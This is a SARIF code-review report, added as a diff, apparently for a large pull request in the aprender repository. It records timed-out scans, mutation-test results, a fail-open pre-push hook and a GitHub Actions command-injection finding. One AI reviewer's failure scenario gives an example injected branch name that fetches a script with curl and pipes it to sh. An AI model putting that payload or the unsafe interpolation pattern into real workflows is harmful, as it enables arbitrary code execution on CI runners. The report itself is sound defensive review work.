@@ -1,0 +1,362 @@
+{
+ "version": "2.1.0",
+ "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+ "runs": [
+  {
+   "tool": {
+    "driver": {
+     "name": "pmat",
+     "informationUri": "https://github.com/paiml/aprender",
+     "version": "checkout",
+     "rules": []
+    }
+   },
+   "invocations": [
+    {
+     "executionSuccessful": false,
+     "commandLine": "pmat query x (index build, 49.4 s); scripts/pr_review_duplication_scan.sh (timed out 420 s)",
+     "toolExecutionNotifications": [
+      {
+       "level": "error",
+       "message": {
+        "text": "The S3.A duplication needle sweep did not complete: killed by the 420 s wrapper timeout (rc=124) on the 15 MB diff. The index half ran; the sweep half did not."
+       },
+       "properties": {
+        "grounding": "measured",
+        "command": [
+         "bash",
+         "scripts/pr_review_duplication_scan.sh",
+         "--base",
+         "00052c01284c",
+         "--head",
+         "b2c1869663a5",
+         "--rust-semantic"
+        ],
+        "exit_code": 124,
+        "stdout_sha256": "580a3c07e6e3a139f42cf198436a47db902128af107b1055c43ef041755dc8fc"
+       }
+      }
+     ]
+    }
+   ],
+   "results": [
+    {
+     "ruleId": "PRREV-4588-DUP-NOT-RUN",
+     "level": "warning",
+     "message": {
+      "text": "Duplication scan not completed: pr_review_duplication_scan.sh --rust-semantic over this 1950-file / 15 MB diff was killed by a 420 s wrapper timeout (earlier try: 600 s). The pmat index was built (94218 functions, 49.4 s, at HEAD) but no needle sweep ran, so duplication_hits [] is non-measurement, not a clean search; all surfaces recorded method none."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "bash",
+       "scripts/pr_review_duplication_scan.sh",
+       "--base",
+       "00052c01284c",
+       "--head",
+       "b2c1869663a5",
+       "--rust-semantic"
+      ],
+      "exit_code": 124,
+      "stdout_sha256": "580a3c07e6e3a139f42cf198436a47db902128af107b1055c43ef041755dc8fc",
+      "failure_scenario": "This folded PR re-implements something on main or a sibling branch and nothing here would say so.",
+      "precision_class": "advisory"
+     }
+    },
+    {
+     "ruleId": "PRREV-4588-CI-BASEREF",
+     "level": "warning",
+     "message": {
+      "text": "ci.yml interpolates ${{ github.event.pull_request.base.ref }} directly into bash run blocks at three sites (two `bash scripts/mutants_table_diff.sh \"${{ ... }}\" pr.diff` calls and `git show \"origin/${{ ... }}:.github/pr-review.pub\"`); the base ref was absent from ci.yml at the merge base (grep -c = 0), so these are new in this PR. Narrow exploitability: base.ref is a branch of the target repo, so only someone who can already create branches there controls it. Bind via env: like head_ref. agy raised the same finding; confirmed."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "grep",
+       "-n",
+       "pull_request.base.ref",
+       ".github/workflows/ci.yml"
+      ],
+      "exit_code": 0,
+      "stdout_sha256": "79b45ba595414f412fb446e88ea60acd2ba7eaf4af4029fe466d714a2dc541d6",
+      "failure_scenario": "A collaborator with branch-create rights names a branch with a command substitution and opens a PR against it; the run block expands it on the self-hosted runner.",
+      "precision_class": "advisory"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": ".github/workflows/ci.yml"
+        },
+        "region": {
+         "startLine": 498
+        }
+       }
+      }
+     ]
+    },
+    {
+     "ruleId": "PRREV-4588-HOOK-FAILOPEN",
+     "level": "note",
+     "message": {
+      "text": "The new pre-push step exits only on rc=1 from `scripts/ci_guards.sh --check-coverage`; rc=2 (check could not run) prints WARN and the push proceeds. Documented as deliberate, local-only (CI runs the same check), but it is the fail-open shape. agy raised the same finding; confirmed."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "git",
+       "diff",
+       "00052c01284c",
+       "b2c1869663a5",
+       "--",
+       ".githooks/pre-push"
+      ],
+      "exit_code": 0,
+      "stdout_sha256": "cf39359e5a06fc7adf932200135c94aa2a40ca88761f65d8ae6d5e376ad20fa3",
+      "failure_scenario": "ci_guards.sh crashes rc=2 on a box without jq; one WARN line among others and the branch is pushed with guard drift unchecked.",
+      "precision_class": "advisory"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": ".githooks/pre-push"
+        },
+        "region": {
+         "startLine": 25
+        }
+       }
+      }
+     ]
+    },
+    {
+     "ruleId": "PRREV-4588-SELFTEST",
+     "level": "note",
+     "message": {
+      "text": "47 of 49 changed guards exposing --self-test exit 0 on first run. The other two were this review's measurement errors: check_no_claim_literals.sh spells it --selftest (rerun 18 cases, 0 failures); check_model_ladder.sh needs python>=3.11 + pyyaml (box has 3.10; rerun in a uv py3.12 venv: 153 cases, 0 bad). 20 changed guards have no --self-test and were NOT measured."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "bash",
+       "scripts/check_model_ladder.sh",
+       "--self-test"
+      ],
+      "exit_code": 0,
+      "stdout_sha256": "e7f564d5bfb009e28fd73e01fbee12906f592feabf3e213a4b2b273354a4066d",
+      "failure_scenario": "A vacuous rule in one of the 20 un-self-tested guards ships unexamined.",
+      "precision_class": "advisory"
+     }
+    },
+    {
+     "ruleId": "PRREV-4588-SCOPE",
+     "level": "note",
+     "message": {
+      "text": "Review scope is a sample: 1950 files / 180,887 insertions / 189 commits cannot be read in a 40-minute budget. Read in full: pre-push hook, ci.yml base.ref sites, receipt-guard and quorum-arm diffs. Grepped/skimmed only: the other eight workflow diffs (no added continue-on-error, `|| true` on a gate, or `if: false`). Not read: Rust logic in aprender-serve, aprender-contracts*, apr-cli beyond agy/CUDA reach; fixture and evidence trees."
+     },
+     "properties": {
+      "grounding": "asserted",
+      "rationale": "reviewer judgement about coverage; no command measures how much was read",
+      "failure_scenario": "A defect in an unread Rust file of this change ships under a DEGRADED verdict that never claimed to have read it.",
+      "precision_class": "advisory"
+     }
+    }
+   ]
+  },
+  {
+   "tool": {
+    "driver": {
+     "name": "cuda-docs-reviewer",
+     "informationUri": "https://github.com/paiml/aprender",
+     "version": "nvidia-cuda-docs MCP",
+     "rules": []
+    }
+   },
+   "invocations": [
+    {
+     "executionSuccessful": true,
+     "commandLine": "search_cuda_docs x8 via the cuda-docs-reviewer agent"
+    }
+   ],
+   "results": [
+    {
+     "ruleId": "PRREV-4588-CUDA-ALIGN",
+     "level": "note",
+     "message": {
+      "text": "CUDA docs arm (cuda-docs-reviewer agent): no device-behaviour claim contradicted. Not settled by the docs: 16-byte-lane alignment of KV rows in the split decode-attention kernel (only the TMA bulk-copy table was found) and the sm_12x slowdown figures. 'Baked into recorded graph arguments' is supported only indirectly. Confirm KV row stride/base are 16-byte aligned."
+     },
+     "properties": {
+      "grounding": "cited",
+      "source": "mcp__nvidia-cuda-docs__search_cuda_docs",
+      "excerpt": "checkCudaErrors(cudaMemset(dPtr, 10, 1)); // Set dPtr to 10\n    printf(\"Host: Launching graph with loop counter set to 10\\n\");\n    checkCudaErrors(cudaGraphLaunch(graphExec, 0));",
+      "excerpt_sha256": "3ea721e6d639b5d21970fa445d7a1e94d55521ed5a18a58365f7682b739c8e67",
+      "failure_scenario": "If the split decode kernel issues 128-bit lane loads on KV rows that are not 16-byte aligned, the load faults or reads wrong data on the device, and no retrieved NVIDIA doc would have caught it.",
+      "precision_class": "advisory"
+     }
+    }
+   ]
+  },
+  {
+   "tool": {
+    "driver": {
+     "name": "crux",
+     "informationUri": "https://github.com/paiml/aprender",
+     "version": "n/a",
+     "rules": []
+    }
+   },
+   "invocations": [
+    {
+     "executionSuccessful": false,
+     "commandLine": "not completed",
+     "toolExecutionNotifications": [
+      {
+       "level": "error",
+       "message": {
+        "text": "CRUX could not be completed: the S3.C trigger fires (new CLI binary/subcommand surface: crates/aprender-ptx-debug, apr-cli lib_parse_ptx_debug_4062.rs, contracts/bin-aprender-ptx-debug--aprender-ptx-debug-v1.yaml) but changed surfaces were not mapped to crux-*.yaml contracts within budget. Recorded unreachable, never 'covers nothing'."
+       },
+       "properties": {
+        "grounding": "measured",
+        "command": [
+         "bash",
+         "scripts/check_pr_review_receipt.sh",
+         "--match-path",
+         "contracts/bin-aprender-ptx-debug--aprender-ptx-debug-v1.yaml"
+        ],
+        "exit_code": 0,
+        "stdout_sha256": "98381bbe49d937501db6968b2613d120d7702d61297c0fabff89da7fdaf26219"
+       }
+      }
+     ]
+    }
+   ],
+   "results": []
+  },
+  {
+   "tool": {
+    "driver": {
+     "name": "mutation",
+     "informationUri": "https://github.com/paiml/aprender",
+     "version": "mutate-guard.sh + mutate_quorum_arm.sh + 3 sets",
+     "rules": []
+    }
+   },
+   "invocations": [
+    {
+     "executionSuccessful": true,
+     "commandLine": "bash scripts/mutate_quorum_arm.sh; bash scripts/mutate-guard.sh (timed out); mutate_{facade_compat,lean_modules_reachable,leanchecker_scoped}_guard.sh"
+    }
+   ],
+   "results": [
+    {
+     "ruleId": "PRREV-4588-MUT-QUORUM",
+     "level": "note",
+     "message": {
+      "text": "mutate_quorum_arm.sh over the changed pr_review_quorum_arm.sh: 134 attempted, 134 killed, 0 survived. facade_compat, lean_modules_reachable and leanchecker_scoped mutation sets each PASS (every mutant killed). Those three sets' counts are not included in attempted."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "bash",
+       "scripts/mutate_quorum_arm.sh"
+      ],
+      "exit_code": 0,
+      "stdout_sha256": "22abc1a07e57e123179b3a9e4955109d8862641a96fdfe97c6ead3a2cfc6cf75",
+      "failure_scenario": "An untested refusal class in the arm script would permit an unattended merge.",
+      "precision_class": "advisory"
+     }
+    },
+    {
+     "ruleId": "PRREV-4588-MUT-RECEIPTGUARD",
+     "level": "warning",
+     "message": {
+      "text": "scripts/mutate-guard.sh over check_pr_review_receipt.sh (changed here: jq -e . replaced by a document count, #3594) did NOT finish: baseline GREEN (168 tests, 0 failures), then 237 mutants at 12 parallel on a host at load ~28 hit the 1300 s wrapper timeout. NOT MEASURED; S3.D's 100% kill for a guard-touching diff is unproven by this run and none of its mutants are counted."
+     },
+     "properties": {
+      "grounding": "measured",
+      "command": [
+       "bash",
+       "scripts/mutate-guard.sh"
+      ],
+      "exit_code": 124,
+      "stdout_sha256": "5963dcfd7898bc98702204d2d8c4406fa074438440e2acd34bef85d4b72dfda1",
+      "failure_scenario": "A mutant in the new document-count branch survives and a blank or doubled receipt is ACCEPTed.",
+      "precision_class": "advisory"
+     }
+    }
+   ]
+  },
+  {
+   "tool": {
+    "driver": {
+     "name": "antigravity",
+     "informationUri": "https://github.com/paiml/aprender",
+     "version": "agy 1.2.14",
+     "rules": []
+    }
+   },
+   "invocations": [
+    {
+     "executionSuccessful": true,
+     "commandLine": "agy -p <prompt file> --model gemini-3.1-pro-high --output-format json --json-schema .pr-review-schema.json --print-timeout 24m --dangerously-skip-permissions (disposable git-archive tree; first 3 MB of 15 MB diff)"
+    }
+   ],
+   "results": [
+    {
+     "ruleId": "AGY-pre-push-fail-open",
+     "level": "note",
+     "message": {
+      "text": "The pre-push CI guard hook fails open and bypasses checks when the underlying script crashes with a system error (rc=2)."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": ".githooks/pre-push"
+        },
+        "region": {
+         "startLine": 25
+        }
+       }
+      }
+     ],
+     "properties": {
+      "grounding": "cited",
+      "source": "rc=0; bash scripts/ci_guards.sh --check-coverage || rc=$?\\n[ \"$rc\" -eq 1 ] && exit 1\\n[ \"$rc\" -eq 0 ] || echo \"WARN: guard drift check could not run (rc=$rc)\"",
+      "excerpt": "rc=0; bash scripts/ci_guards.sh --check-coverage || rc=$?\\n[ \"$rc\" -eq 1 ] && exit 1\\n[ \"$rc\" -eq 0 ] || echo \"WARN: guard drift check could not run (rc=$rc)\"",
+      "excerpt_sha256": "b4e4b19c71dcc8bace2951d8df1d25d84ed98959ab7d057d288ca3cdc95b6edc",
+      "failure_scenario": "If the `scripts/ci_guards.sh --check-coverage` script fails with a system error (e.g. exit code 2 due to a missing dependency like `jq` or a YAML parse failure), `rc` will equal 2. The hook only exits on `rc=1` and warns on all other non-zero codes, permitting the push to proceed. This violates the 'Refuse Rather Than Guess' user rule, which mandates that missing files or parsing errors halt execution immediately rather than emitting warnings and failing open.",
+      "precision_class": "advisory"
+     }
+    },
+    {
+     "ruleId": "AGY-ci-yml-cmd-injection",
+     "level": "warning",
+     "message": {
+      "text": "Command injection vulnerability via direct interpolation of `${{ github.event.pull_request.base.ref }}` in Bash run blocks."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": ".github/workflows/ci.yml"
+        },
+        "region": {
+         "startLine": 498
+        }
+       }
+      }
+     ],
+     "properties": {
+      "grounding": "cited",
+      "source": "run: bash scripts/mutants_table_diff.sh \"${{ github.event.pull_request.base.ref }}\" pr.diff",
+      "excerpt": "run: bash scripts/mutants_table_diff.sh \"${{ github.event.pull_request.base.ref }}\" pr.diff",
+      "excerpt_sha256": "bc0ceb1464406369104980a01d8f0bed82cf549a6320f0c43fd5d51d97b04fe7",
+      "failure_scenario": "An attacker with branch creation permissions on the target repository could create a branch containing bash metacharacters (e.g. `$(curl malicious_script | sh)`) and submit a pull request against it. The `${{ github.event.pull_request.base.ref }}` context variable is interpolated directly into double quotes in `bash` run blocks. This causes Bash to evaluate the embedded command substitution, allowing arbitrary command execution on the self-hosted runner. The context variable should be bound via the `env:` map, just as `github.head_ref` correctly is.",
+      "precision_class": "advisory"
+     }
+    }
+   ]
+  }
+ ]
+}
